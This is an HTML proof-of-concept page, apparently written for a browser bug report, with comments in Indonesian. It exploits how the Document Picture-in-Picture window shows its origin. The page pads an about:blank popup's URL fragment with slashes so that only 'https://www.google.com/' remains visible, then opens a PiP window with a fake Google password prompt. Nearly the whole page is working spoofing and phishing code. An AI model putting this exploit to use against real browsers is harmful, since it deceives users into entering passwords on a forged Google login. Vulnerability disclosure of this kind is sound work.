<!DOCTYPE html>
<html lang="en">
<head>
    <title>Document PiP Header Spoof PoC</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <script>
        let step = 0;

        document.addEventListener('DOMContentLoaded', () => {
            document.body.addEventListener('click', async () => {
                step++;

                if (step === 1) {
                    // Klik pertama: buka popup about:blank dengan fragment yang berisi URL palsu
                    // Inti kerentanan: host about:blank kosong, getUrlString() fallback ke seluruh spec
                    // TruncateAt.START memotong awal, hanya menyisakan …https://www.google.com/
                    const padding = '/'.repeat(300);
                    const spoofedUrl = 'https://www.google.com/';
                    const payload = padding + spoofedUrl;
                    const popup = window.open('about:blank#' + payload, 'poc', 'width=400,height=400');

                    // Isi popup dengan tombol penipuan (menggunakan DOM API, jangan document.write, jika tidak URL akan di-reset)
                    popup.document.body.innerHTML = `
                        <h1 style="color:#333;">Verifikasi Keamanan</h1>
                        <p>Silakan ketuk untuk melanjutkan</p>
                        <button id="pipBtn" style="padding:20px;font-size:18px;">Konfirmasi</button>
                    `;

                    // Klik kedua terjadi di dalam popup
                    popup.document.getElementById('pipBtn').addEventListener('click', async () => {
                        try {
                            const pipWin = await documentPictureInPicture.requestWindow({
                                width: 220,
                                height: 300
                            });

                            // Menulis konten penipuan ke dalam jendela PiP
                            pipWin.document.body.innerHTML = `
                                <h2 style="color:red;">Google</h2>
                                <p>Verifikasi akun Anda</p>
                                <input type="password" placeholder="Kata sandi" style="width:100%;">
                                <button>Masuk</button>
                            `;
                        } catch (e) {
                            console.log('PiP gagal:', e.message);
                        }
                    });
                }
            });
        });
    </script>
</head>
<body style="margin:0;padding:0;">
    <br><br><br>
    <center>
        <h1>Ketuk di mana saja untuk memulai (dua kali)</h1>
        <p style="color:#666;">Klik pertama: buka popup · Klik kedua: picu PiP</p>
    </center>
</body>
</html>
